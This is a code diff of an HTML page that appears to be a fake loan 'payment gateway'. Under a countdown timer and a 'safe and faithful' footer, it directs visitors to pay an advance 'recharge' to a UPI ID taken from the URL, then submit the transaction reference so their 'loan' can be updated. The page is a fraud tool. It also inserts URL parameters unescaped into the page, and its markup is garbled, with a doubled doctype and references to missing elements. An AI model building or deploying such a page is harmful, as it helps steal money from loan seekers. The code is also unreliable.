@@ -1,4 +1,167 @@
-<!DOCTYPE html>
+<!<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Payment Gateway Link</title>
+    <link rel="stylesheet" href="style.css">
+    <script>
+        // Timer logic
+        let countdownTime = 6 * 60; // 6 minutes in seconds
+
+        // Start the countdown timer when the page loads
+        function startCountdown() {
+            const timerElement = document.getElementById('timer');
+            const interval = setInterval(() => {
+                const minutes = Math.floor(countdownTime / 60);
+                const seconds = countdownTime % 60;
+
+                // Display remaining time
+                timerElement.innerText = `Time Left: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                
+                // Check if time has expired
+                if (countdownTime <= 0) {
+                    clearInterval(interval);
+                    // Replace page content with expiration message
+                    document.body.innerHTML = `
+                        <div style="text-align: center; margin-top: 50px;">
+                            <h1>Session Expired</h1>
+                            <img src="https://png.pngtree.com/png-clipart/20230806/original/pngtree-time-expired-ink-grungy-course-vector-picture-image_9915504.png" 
+                                 alt="Time Expired" style="max-width: 100%; height: auto;">
+                        </div>
+                    `;
+                }
+
+                countdownTime--; // Decrement time
+            }, 1000);
+        }
+
+        window.onload = startCountdown;
+    </script>
+</head>
+<body>
+    <!-- Timer Display -->
+    <div id="timer" style="text-align: center; font-size: 1.5rem; margin-top: 20px; color: red;">
+        Time Left: 6:00
+    </div>
+
+    <!-- popup box start from here -->
+    <div id="popup_wrapper">
+        <div class="box">
+            <div class="text">*After you paid, you must come back here to submit the Ref/UTR No. (12 digits). Then your money is credited to your account.</div>
+            <div class="image"><img src="utr_example.png" alt="image" width="100%"></div>
+            <button onclick="document.querySelector('#popup_wrapper').style.display='none';">OK</button>
+        </div>
+    </div>
+    <!-- popup box end here -->
+                
+    <!-- step 1 start from here -->
+    <section id="step_1">
+        <div class="-container">
+            <div class="title">Step 1 : Verify Your Name And Loan Amount</div>
+            <div class="wrapper">
+                <div class="center">
+                    <span id="amntInput"></span>
+                </div>
+            </div>
+            <hr>
+            <div class="wrapper">
+                <div class="center">
+                    <span id="amntInput"></span>
+                </div>
+            </div>
+            <hr>
+    </section>
+    <!-- step 1 end here -->
+
+    <!-- step 2 start from here -->
+    <section id="step_2">
+        <div class="-container">
+            <div class="title">Step 2 : Copy The UPI ID </div>
+            <div class="wrapper">
+                <div class=" Down Center">
+                    <span id="vpaInput"></span>
+                    <button onclick="copyText('vpaInput')">Copy</button>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- step 2 end here -->
+
+    <!-- step 3 start from here -->
+    <section id="step_3">
+        <!-- error message -->
+        <div class="errMsg">Please input a 12-digit reference code</div>
+        <!-- success message -->
+        <div class="succMsg">Success! Your UTR has been submitted.</div>
+        <!-- main -->
+        <div class="-container">
+            <div class="title">Step 3 : Please Enter Ref No. After Making The Payment</div>
+            <form name="upiForm" action="" onsubmit="return valid_upi_form()" method="post">
+                <input type="text" id="refCode" placeholder="UTR (UPI Ref. ID) must be 12 digits">
+                <input type="submit" value="Submit UTR">
+            </form>
+        </div>
+    </section>
+    <!-- step 3 end here -->
+
+    <footer><h4>safe and faithful</h4></footer>
+
+    <script>
+        // Copy elements
+        function copyText(element) {
+            var copyText = document.getElementById(element).innerText;
+            var copyAlert = document.querySelector("#step_1 .copyAlert");
+
+            navigator.clipboard.writeText(copyText);
+            copyAlert.classList.add("active");
+            setTimeout(function() {copyAlert.classList.remove("active")}, 1500);
+        }
+
+        // Get data from URL parameters
+        window.addEventListener('load', () => {
+            const params = (new URL(document.location)).searchParams;
+            const AMNT = params.get('amntInput');
+            const NAME = params.get('nameInput');
+            const VPA = params.get('vpaInput');
+
+            document.getElementById("amntInput").innerHTML = AMNT;
+            document.getElementById("nameInput").innerHTML = NAME;
+            document.getElementById("vpaInput").innerHTML = VPA;
+        });
+
+        // UPI form validation
+        function valid_upi_form() {
+            let reference = document.getElementById("refCode").value;
+            let countRef = reference.length;
+            let err = document.querySelector("#step_4 .errMsg");
+            let clientName = document.getElementById("clientName").value; // Get the client name
+
+            if (countRef != 12) {
+                // Show error message for invalid input
+                err.classList.add("active");
+                setTimeout(function() {err.classList.remove("active")}, 1500);
+                return false;
+            } else if (clientName.trim() === "") {
+                alert("Please enter your name before submitting UTR.");
+                return false;
+            } else {
+                // Replace the page content with the success image and name
+                document.body.innerHTML = `
+                    <div style="text-align: center; margin-top: 50px;">
+                        <h1>Dear ${clientName}, UTR Submission Successful</h1>
+                        <img src="https://1drv.ms/i/c/973dfac97467cb88/EVUg449rjO1AiX6nVB5Zef8Bv9350eQMQJqTDf1RPn6Iuw?e=PRTtTF" 
+                             alt="Success Image" style="max-width: 100%; height: auto;">
+                        <h3>We Will Update Your Loan Immediately After Receiving The Recharge.</h3>
+                    </div>
+                `;
+                return false;
+            }
+        }
+    </script>
+</body>
+</html> html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -43,31 +206,22 @@
     </section>
     <!-- step 1 end here -->
 
-    <!-- step 2 start from here -->
+    <!-- step 1 start from here -->
     <section id="step_2">
         <div class="-container">
             <div class="title">Step 2 : Copy The UPI ID </div>
-            <div class="wrapper">
-                <div class="Center">
+            
+                <div class="center">
                     <span id="vpaInput"></span>
                     <button onclick="copyText('vpaInput')">Copy</button>
                 </div>
             </div>
         </div>
     </section>
-    <!-- step 2 end here -->
+    <!-- step 1 end here -->
 
     <!-- step 3 start from here -->
     <section id="step_3">
-        <div class="-container">
-            <div class="title">Step 3 : Pay On Upi Which You Copy From Here </div>
-            <div class="item"><i class="bi bi-exclamation-triangle"></i> Please Record Your Reference No. {UTR} After Payment And Dont Use Anywhere If You Submit Utr Anywhere Then Loan Will Not Update</div>
-        </div>
-    </section>
-    <!-- step 3 end here -->
-
-    <!-- step 4 start from here -->
-    <section id="step_4">
         <!-- error message -->
         <div class="errMsg">Please input a 12-digit reference code</div>
         <!-- success message -->
@@ -81,7 +235,7 @@
             </form>
         </div>
     </section>
-    <!-- step 4 end here -->
+    <!-- step 3 end here -->
 
     <footer><h4>safe and faithful</h4></footer>
 
